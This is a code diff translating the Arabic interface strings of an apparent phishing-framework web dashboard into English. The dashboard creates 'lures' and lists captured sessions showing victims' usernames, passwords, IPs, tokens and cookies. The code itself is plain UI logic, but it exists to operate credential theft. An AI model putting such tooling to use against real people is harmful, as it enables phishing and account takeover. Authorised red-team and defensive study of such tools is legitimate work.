         button.addEventListener('click', async function() {
@@ -812,94 +811,94 @@ function populateLuresTable(lures) {
             const enable = action === 'enable';
             
             try {
-                // عرض رسالة انتظار
-                showToast('جاري التنفيذ', `جاري ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure...`, 'info');
+                // Show loading spinner
+                showToast('Processing', `Processing ${enable ? 'enabling' : 'disabling'} Lure...`, 'info');
                 
-                // محاولة تفعيل/تعطيل الـ lure
+                // Attempt to enable/disable the lure
                 const success = await toggleLure(index, enable);
                 
                 if (success) {
-                    // تحديث جدول الـ Lures
+                    // Update Lures table
                     const updatedLures = await fetchLures();
                     populateLuresTable(updatedLures);
                 }
             } catch (error) {
-                console.error(`خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure:`, error);
-                showToast('خطأ', `حدث خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure`, 'error');
+                console.error(`Error in ${enable ? 'enabling' : 'disabling'} Lure:`, error);
+                showToast('Error', `An error occurred while ${enable ? 'enabling' : 'disabling'} Lure`, 'error');
             }
         });
     });
     
-    // إضافة معالجات الأحداث لأزرار الحذف
+    // Add event listeners for delete buttons
     const deleteButtons = tbody.querySelectorAll('.delete-lure-btn');
     deleteButtons.forEach(button => {
         button.addEventListener('click', async function() {
             const index = Number(this.dataset.index);
-            if (confirm('هل أنت متأكد من حذف هذا الـ Lure؟')) {
+            if (confirm('Are you sure you want to delete this Lure?')) {
                 try {
-                    // عرض رسالة انتظار
-                    showToast('جاري الحذف', 'جاري حذف الـ Lure...', 'info');
+                    // Show loading spinner
+                    showToast('Processing', 'Processing Lure deletion...', 'info');
                     
-                    // محاولة حذف الـ lure
+                    // Attempt to delete the lure
                     const success = await deleteLure(index);
                     
                     if (success) {
-                        // تحديث جدول الـ Lures
+                        // Update Lures table
                         const updatedLures = await fetchLures();
                         populateLuresTable(updatedLures);
-                        // تحديث الإحصائيات
+                        // Update statistics
                         updateDashboard();
                         
-                        showToast('تم بنجاح', 'تم حذف الـ Lure بنجاح', 'success');
+                        showToast('Success', 'Successfully deleted Lure', 'success');
                     } else {
-                        showToast('خطأ', 'فشل في حذف الـ Lure', 'error');
+                        showToast('Error', 'Failed to delete Lure', 'error');
                     }
                 } catch (error) {
-                    console.error('خطأ أثناء حذف الـ Lure:', error);
-                    showToast('خطأ', 'حدث خطأ أثناء حذف الـ Lure', 'error');
+                    console.error('Error in deleting Lure:', error);
+                    showToast('Error', 'An error occurred while deleting Lure', 'error');
                 }
             }
         });
     });
 }
 
-// تعبئة جدول الـ Sessions
+// Populate Sessions table
 function populateSessionsTable(sessions) {
     const tbody = sessionsTable.querySelector('tbody');
     tbody.innerHTML = '';
     
     if (!sessions || sessions.length === 0) {
         const tr = document.createElement('tr');
-        tr.innerHTML = `<td colspan="7" class="text-center">لا توجد جلسات مسجلة</td>`;
+        tr.innerHTML = `<td colspan="7" class="text-center">No logged sessions</td>`;
         tbody.appendChild(tr);
         return;
     }
     
-    console.log('بيانات الجلسات الكاملة:', sessions);
+    console.log('Full sessions data:', sessions);
     
     sessions.forEach(session => {
-        // التأكد من وجود كافة البيانات الضرورية باستخدام جميع المسميات المحتملة
-        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'غير معروف';
+        // Ensure all required data is present using all possible identifiers
+        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'Unknown';
         const phishlet = session.phishlet || session.Phishlet || '';
-        const username = session.username || session.Username || session.user || session.User || session.login || 'غير مسجل';
-        const password = session.password || session.Password || session.pass || session.Pass || 'غير مسجلة';
-        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'غير معروف';
+        const username = session.username || session.Username || session.user || session.User || session.login || 'Not logged in';
+        const password = session.password || session.Password || session.pass || session.Pass || 'Not logged in';
+        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'Unknown';
         
-        // محاولة العثور على وقت الإنشاء، قد يكون في عدة حقول مختلفة
+        // Attempt to find creation time, it might be in multiple fields
         let created = null;
-        if (session.create_time) created = session.create_time * 1000; // تحويل من ثواني إلى مللي ثانية
+        if (session.create_time) created = session.create_time * 1000; // Convert from seconds to milliseconds
         else if (session.CreateTime) created = session.CreateTime * 1000;
         else if (session.created) created = session.created;
         else if (session.timestamp) created = session.timestamp;
         else if (session.time) created = session.time;
         
-        // التحقق من وجود رموز أو بيانات اعتماد
+        // Check for presence of credentials
         const hasCredentials = (
             (session.tokens && Object.keys(session.tokens).length > 0) || 
             (session.Tokens && Object.keys(session.Tokens).length > 0) ||
             (session.CookieTokens && Object.keys(session.CookieTokens).length > 0) ||
-            username !== 'غير مسجل' || 
-            password !== 'غير مسجلة'
+            username !== 'Not logged in' || 
+            password !== 'Not logged in'
         );
         
         const tr = document.createElement('tr');
@@ -912,15 +911,15 @@ function populateSessionsTable(sessions) {
             <td>${formatDate(created)}</td>
             <td class="action-buttons">
                 <button class="btn btn-sm btn-primary" data-action="view" data-id="${sessionId}">
-                    <i class="fas fa-eye"></i> عرض
+                    <i class="fas fa-eye"></i> View
                 </button>
-                ${hasCredentials ? `<span class="badge badge-success">بيانات اعتماد</span>` : ''}
+                ${hasCredentials ? `<span class="badge badge-success">Logged in credentials</span>` : ''}
             </td>
         `;
         tbody.appendChild(tr);
     });
     
-    // إضافة معالجات الأحداث لأزرار العرض
+    // Add event listeners for view buttons
     const viewButtons = tbody.querySelectorAll('[data-action="view"]');
     viewButtons.forEach(button => {
         button.addEventListener('click', async function() {
@@ -930,38 +929,38 @@ function populateSessionsTable(sessions) {
     });
 }
 
-// عرض تفاصيل الجلسة
+// Show session details
 async function showSessionDetails(id) {
-    // إنشاء النافذة المنبثقة
+    // Create the popup window
     const modal = document.createElement('div');
     modal.className = 'modal active';
     modal.innerHTML = `
         <div class="modal-content modal-lg">
             <div class="modal-header">
-                <h3>تفاصيل الجلسة</h3>
+                <h3>Session Details</h3>
                 <button class="modal-close">&times;</button>
             </div>
             <div class="modal-body">
                 <div class="session-details">
                     <div class="loading-spinner">
                         <div class="spinner"></div>
-                        <p style="margin-top: 10px;">جاري تحميل البيانات...</p>
+                        <p style="margin-top: 10px;">Loading data...</p>
                     </div>
                     <div class="session-info"></div>
                     <div class="tokens-section">
-                        <h4>بيانات الاعتماد والرموز</h4>
+                        <h4>Credentials and Tokens</h4>
                         <div class="tokens-container"></div>
                     </div>
                 </div>
             </div>
             <div class="modal-footer">
-                <button class="btn btn-secondary modal-close-btn">إغلاق</button>
+                <button class="btn btn-secondary modal-close-btn">Close</button>
             </div>
         </div>
     `;
     document.body.appendChild(modal);
     
-    // إضافة معالجات الأحداث للإغلاق
+    // Add event listeners for closing
     const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
     closeButtons.forEach(button => {
         button.addEventListener('click', function() {
@@ -969,33 +968,33 @@ async function showSessionDetails(id) {
         });
     });
     
-    // جلب تفاصيل الجلسة
+    // Fetch session details
     try {
         const sessionDetails = await fetchSessionDetails(id);
         const loadingSpinner = modal.querySelector('.loading-spinner');
         loadingSpinner.style.display = 'none';
         
-        console.log('تفاصيل الجلسة بعد الاستخراج:', sessionDetails);
+        console.log('Session details after extraction:', sessionDetails);
         
         if (!sessionDetails) {
-            showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
+            showToast('Error', 'Failed to fetch session details', 'error');
             return;
         }
         
-        // تحضير البيانات مع التحقق من وجودها
-        const sessionId = sessionDetails.id || sessionDetails.session_id || sessionDetails.SessionId || 'غير معروف';
-        const phishlet = sessionDetails.phishlet || 'غير معروف';
-        const username = sessionDetails.username || sessionDetails.user || sessionDetails.login || 'غير مسجل';
-        const password = sessionDetails.password || sessionDetails.pass || 'غير مسجلة';
-        const ip = sessionDetails.remote_addr || sessionDetails.ip || sessionDetails.remote_ip || 'غير معروف';
-        const userAgent = sessionDetails.user_agent || sessionDetails.useragent || sessionDetails.UserAgent || 'غير متوفر';
+        // Prepare data with verification of presence
+        const sessionId = sessionDetails.id || sessionDetails.session_id || sessionDetails.SessionId || 'Unknown';
+        const phishlet = sessionDetails.phishlet || 'Unknown';
+        const username = sessionDetails.username || sessionDetails.user || sessionDetails.login || 'Not logged in';
+        const password = sessionDetails.password || sessionDetails.pass || 'Not logged in';
+        const ip = sessionDetails.remote_addr || sessionDetails.ip || sessionDetails.remote_ip || 'Unknown';
+        const userAgent = sessionDetails.user_agent || sessionDetails.useragent || sessionDetails.UserAgent || 'Not available';
         const created = sessionDetails.created || sessionDetails.timestamp || sessionDetails.time || null;
         
-        // عرض معلومات الجلسة
+        // Display session information
         const sessionInfoElement = modal.querySelector('.session-info');
         sessionInfoElement.innerHTML = `
             <div class="info-item">
-                <span class="info-label">معرف الجلسة:</span>
+                <span class="info-label">Session ID:</span>
                 <span class="info-value">${sessionId}</span>
             </div>
             <div class="info-item">
@@ -1003,31 +1002,31 @@ async function showSessionDetails(id) {
                 <span class="info-value">${phishlet}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">اسم المستخدم:</span>
+                <span class="info-label">Username:</span>
                 <span class="info-value">${username}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">كلمة المرور:</span>
+                <span class="info-label">Password:</span>
                 <span class="info-value">${password}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">عنوان IP:</span>
+                <span class="info-label">IP Address:</span>
                 <span class="info-value">${ip}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">وكيل المستخدم:</span>
+                <span class="info-label">User Agent:</span>
                 <span class="info-value">${userAgent}</span>
             </div>
             <div class="info-item">
-                <span class="info-label">تاريخ الإنشاء:</span>
+                <span class="info-label">Creation Time:</span>
                 <span class="info-value">${formatDate(created)}</span>
             </div>
         `;
         
-        // عرض الرموز والبيانات
+        // Display tokens and data
         const tokensContainer = modal.querySelector('.tokens-container');
         
-        // التحقق من وجود الرموز - قد تكون في أي من هذه الحقول حسب هيكل البيانات
+        // Check for presence of tokens - they might be in any of these fields depending on data structure
         const tokens = sessionDetails.tokens || sessionDetails.Tokens || sessionDetails.cookies || {};
         
         if (tokens && Object.keys(tokens).length > 0) {
@@ -1042,29 +1041,29 @@ async function showSessionDetails(id) {
             }
             tokensContainer.innerHTML = tokensHTML;
         } else {
-            tokensContainer.innerHTML = '<p class="no-tokens">لا توجد بيانات اعتماد مسجلة لهذه الجلسة</p>';
+            tokensContainer.innerHTML = '<p class="no-tokens">No logged in credentials for this session</p>';
         }
         
     } catch (error) {
-        console.error('خطأ في جلب تفاصيل الجلسة:', error);
-        showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
+        console.error('Error in fetching session details:', error);
+        showToast('Error', 'Failed to fetch session details', 'error');
     }
 }
 
-// إظهار نافذة إنشاء Lure جديد
+// Show new Lure modal
 async function showCreateLureModal() {
-    // جلب قائمة الـ Phishlets لعرضها في القائمة المنسدلة
+    // Fetch Phishlets list for display in dropdown
     const phishlets = await fetchPhishlets();
     
-    console.log('بيانات الـ Phishlets عند إنشاء lure:', phishlets);
+    console.log('Phishlets data at lure creation:', phishlets);
     
-    // إنشاء النافذة المنبثقة
+    // Create the popup window
     const modal = document.createElement('div');
     modal.className = 'modal active';
     modal.innerHTML = `
         <div class="modal-content">
             <div class="modal-header">
-                <h3>إنشاء Lure جديد</h3>
+                <h3>Create New Lure</h3>
                 <button class="modal-close">&times;</button>
             </div>
             <div class="modal-body">
@@ -1072,33 +1071,33 @@ async function showCreateLureModal() {
                     <div class="form-group">
                         <label for="lure-phishlet">Phishlet</label>
                         <select id="lure-phishlet" class="form-control" required>
-                            <option value="">-- اختر Phishlet --</option>
+                            <option value="">-- Select Phishlet --</option>
                             ${phishlets.map(p => {
-                                // التحقق من حالة التفعيل باستخدام جميع الاحتمالات الممكنة للحقل
+                                // Check activation status using all possible fields for the field
                                 const isActive = p.is_active === true || p.isActive === true || p.IsActive === true || p.enabled === true;
-                                return `<option value="${p.name}" ${isActive ? '' : 'disabled'}>${p.name} ${isActive ? '' : '(معطل)'}</option>`;
+                                return `<option value="${p.name}" ${isActive ? '' : 'disabled'}>${p.name} ${isActive ? '' : '(Disabled)'}</option>`;
                             }).join('')}
                         </select>
                     </div>
                     <div class="form-group">
-                        <label for="lure-hostname">اسم المضيف (Hostname)</label>
+                        <label for="lure-hostname">Hostname</label>
                         <input type="text" id="lure-hostname" class="form-control" required>
                     </div>
                     <div class="form-group">
-                        <label for="lure-path">المسار (اختياري)</label>
+                        <label for="lure-path">Path (optional)</label>
                         <input type="text" id="lure-path" class="form-control" placeholder="/login">
                     </div>
                 </form>
             </div>
             <div class="modal-footer">
-                <button class="btn btn-secondary modal-close-btn">إلغاء</button>
-                <button class="btn btn-primary" id="submit-lure">إنشاء</button>
+                <button class="btn btn-secondary modal-close-btn">Cancel</button>
+                <button class="btn btn-primary" id="submit-lure">Create</button>
             </div>
         </div>
     `;
     document.body.appendChild(modal);
     
-    // إضافة معالجات الأحداث للإغلاق
+    // Add event listeners for closing
     const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
     closeButtons.forEach(button => {
         button.addEventListener('click', function() {
@@ -1106,7 +1105,7 @@ async function showCreateLureModal() {
         });
     });
     
-    // معالج الحدث لإرسال النموذج
+    // Event handler for submitting the form
     const submitButton = modal.querySelector('#submit-lure');
     submitButton.addEventListener('click', async function() {
         const phishlet = modal.querySelector('#lure-phishlet').value;
@@ -1114,7 +1113,7 @@ async function showCreateLureModal() {
         const path = modal.querySelector('#lure-path').value;
         
         if (!phishlet || !hostname) {
-            showToast('خطأ', 'يرجى ملء جميع الحقول المطلوبة', 'error');
+            showToast('Error', 'Please fill in all required fields', 'error');
             return;
         }
         
@@ -1128,35 +1127,35 @@ async function showCreateLureModal() {
         if (result) {
             document.body.removeChild(modal);
             
-            // تحديث جدول الـ Lures
+            // Update Lures table
             const updatedLures = await fetchLures();
             populateLuresTable(updatedLures);
             
-            // تحديث الإحصائيات
+            // Update statistics
             updateDashboard();
             
-            // تحديث شهادات SSL للطعم الجديد
-            showToast('معلومات', 'تم إنشاء الطعم بنجاح. جاري تحديث شهادات SSL...', 'info');
+            // Update SSL certificates for new lure
+            showToast('Information', 'Successfully created lure. Updating SSL certificates...', 'info');
             await updateCertificates();
         }
     });
 }
 
-// تنسيق التاريخ
+// Format date
 function formatDate(dateString) {
-    if (!dateString) return 'غير متوفر';
+    if (!dateString) return 'Not available';
     
     try {
-        // محاولة إنشاء كائن تاريخ
+        // Attempt to create Date object
         const date = new Date(dateString);
         
-        // التحقق من صحة التاريخ
+        // Check date validity
         if (isNaN(date.getTime())) {
-            return 'تاريخ غير صالح';
+            return 'Invalid date';
         }
         
-        // تنسيق التاريخ بشكل صحيح
-        return date.toLocaleString('ar-SA', {
+        // Format date correctly
+        return date.toLocaleString('en-US', {
             year: 'numeric',
             month: 'numeric',
             day: 'numeric',
@@ -1165,43 +1164,43 @@ function formatDate(dateString) {
             second: '2-digit'
         });
     } catch (error) {
-        console.error('خطأ في تنسيق التاريخ:', error);
-        return 'تاريخ غير صالح';
+        console.error('Error in date formatting:', error);
+        return 'Invalid date';
     }
 }
 
 // ================= Event Handlers =================
 
-// تبديل قائمة التنقل الجانبية
+// Toggle sidebar navigation
 menuToggle.addEventListener('click', function() {
     sidebar.classList.toggle('active');
 });
 
-// التنقل بين التبويبات
+// Navigate between tabs
 navLinks.forEach(link => {
     link.addEventListener('click', function(e) {
         e.preventDefault();
         
-        // إزالة الفئة النشطة من جميع الروابط
+        // Remove active class from all links
         document.querySelectorAll('.sidebar-nav a').forEach(a => {
             a.classList.remove('active');
         });
         
-        // إضافة الفئة النشطة إلى الرابط الحالي
+        // Add active class to current link
         this.classList.add('active');
         
-        // إخفاء جميع محتويات التبويبات
+        // Hide all tab contents
         document.querySelectorAll('.tab-content').forEach(tab => {
             tab.style.display = 'none';
         });
         
-        // إظهار محتوى التبويب المطلوب
+        // Show content of active tab
         const targetId = this.getAttribute('data-target');
         const targetTab = document.getElementById(targetId);
         if (targetTab) {
             targetTab.style.display = 'block';
             
-            // تحديث البيانات بناءً على التبويب النشط
+            // Update data based on active tab
             if (targetId === 'phishlets-tab') {
                 fetchPhishlets().then(data => populatePhishletsTable(data));
             } else if (targetId === 'lures-tab') {
@@ -1215,51 +1214,50 @@ navLinks.forEach(link => {
     });
 });
 
-// أزرار تحديث البيانات
+// Update data buttons
 phishletsRefreshBtn.addEventListener('click', function() {
     fetchPhishlets().then(data => {
         populatePhishletsTable(data);
-        showToast('تم التحديث', 'تم تحديث قائمة الـ Phishlets بنجاح', 'success');
+        showToast('Success', 'Successfully updated Phishlets', 'success');
     });
 });
 
 luresRefreshBtn.addEventListener('click', function() {
     fetchLures().then(data => {
         populateLuresTable(data);
-        showToast('تم التحديث', 'تم تحديث قائمة الـ Lures بنجاح', 'success');
+        showToast('Success', 'Successfully updated Lures', 'success');
     });
 });
 
 sessionsRefreshBtn.addEventListener('click', function() {
     fetchSessions().then(data => {
         populateSessionsTable(data);
-        showToast('تم التحديث', 'تم تحديث قائمة الـ Sessions بنجاح', 'success');
+        showToast('Success', 'Successfully updated Sessions', 'success');
     });
 });
 
-// زر تحديث شهادات SSL
-const updateCertificatesBtn = document.getElementById('update-certificates-btn');
+// SSL certificates update button
 if (updateCertificatesBtn) {
     updateCertificatesBtn.addEventListener('click', function() {
         updateCertificates();
     });
 }
 
-// زر إنشاء Lure جديد
+// Create new Lure button
 createLureBtn.addEventListener('click', showCreateLureModal);
 
-// زر تسجيل الخروج
+// Logout button
 logoutBtn.addEventListener('click', function() {
-    // حذف الـ token من التخزين المحلي
+    // Remove token from local storage
     localStorage.removeItem('authToken');
-    // توجيه المستخدم إلى صفحة تسجيل الدخول
+    // Redirect user to login page
     window.location.href = '/login';
 });
 
-// تنفيذ طلب لتحديث شهادات SSL
+// Perform SSL certificates update request
 async function updateCertificates() {
     try {
-        showToast('جاري التنفيذ', 'جاري تحديث شهادات SSL...', 'info');
+        showToast('Processing', 'Updating SSL certificates...', 'info');
         
         const response = await fetch(`${API_BASE_URL}/config/certificates`, {
             method: 'POST',
@@ -1267,64 +1265,64 @@ async function updateCertificates() {
         });
         
         if (!response.ok) {
-            throw new Error(`فشل في تحديث شهادات SSL: ${response.statusText}`);
+            throw new Error(`Failed to update SSL certificates: ${response.statusText}`);
         }
         
         const data = await response.json();
-        console.log('استجابة تحديث الشهادات:', data);
+        console.log('SSL certificates update response:', data);
         
         if (data.success) {
-            showToast('تم بنجاح', data.message || 'تم تحديث شهادات SSL بنجاح', 'success');
+            showToast('Success', data.message || 'Successfully updated SSL certificates', 'success');
             return true;
         } else {
-            showToast('خطأ', data.message || 'فشل في تحديث شهادات SSL', 'error');
+            showToast('Error', data.message || 'Failed to update SSL certificates', 'error');
             return false;
         }
     } catch (error) {
-        console.error('خطأ في تحديث شهادات SSL:', error);
-        showToast('خطأ', `حدث خطأ: ${error.message}`, 'error');
+        console.error('Error in updating SSL certificates:', error);
+        showToast('Error', `An error occurred: ${error.message}`, 'error');
         return false;
     }
 }
 
 // ================= Initialization =================
 
-// تهيئة الصفحة عند التحميل
+// Initialize page on load
 document.addEventListener('DOMContentLoaded', function() {
-    // التحقق من حالة تسجيل الدخول
+    // Check login status
     checkAuthentication();
     
-    // تحديث البيانات فور تحميل الصفحة
+    // Update data on page load
     updateDashboard();
     
-    // تفعيل التبويب الافتراضي (لوحة القيادة)
+    // Activate default tab (dashboard)
     document.querySelector('.sidebar-nav li:first-child a').click();
     
-    // إضافة معالج الأحداث للتبويبات
+    // Add event listener for tabs
     document.querySelectorAll('.sidebar-nav a').forEach(link => {
         link.addEventListener('click', function(e) {
             e.preventDefault();
             
-            // إزالة الفئة النشطة من جميع الروابط
+            // Remove active class from all links
             document.querySelectorAll('.sidebar-nav a').forEach(a => {
                 a.classList.remove('active');
             });
             
-            // إضافة الفئة النشطة إلى الرابط الحالي
+            // Add active class to current link
             this.classList.add('active');
             
-            // إخفاء جميع محتويات التبويبات
+            // Hide all tab contents
             document.querySelectorAll('.tab-content').forEach(tab => {
                 tab.style.display = 'none';
             });
             
-            // إظهار محتوى التبويب المطلوب
+            // Show content of active tab
             const targetId = this.getAttribute('data-target');
             const targetTab = document.getElementById(targetId);
             if (targetTab) {
                 targetTab.style.display = 'block';
                 
-                // تحديث البيانات بناءً على التبويب النشط
+                // Update data based on active tab
                 if (targetId === 'phishlets-tab') {
                     fetchPhishlets().then(data => populatePhishletsTable(data));
                 } else if (targetId === 'lures-tab') {
@@ -1338,9 +1336,9 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
     
-    // تحديث البيانات كل 30 ثانية
+    // Update data every 30 seconds
     setInterval(function() {
-        // تحديث البيانات بناءً على التبويب النشط
+        // Update data based on active tab
         const activeTab = document.querySelector('.sidebar-nav a.active');
         if (activeTab) {
             const targetId = activeTab.getAttribute('data-target');
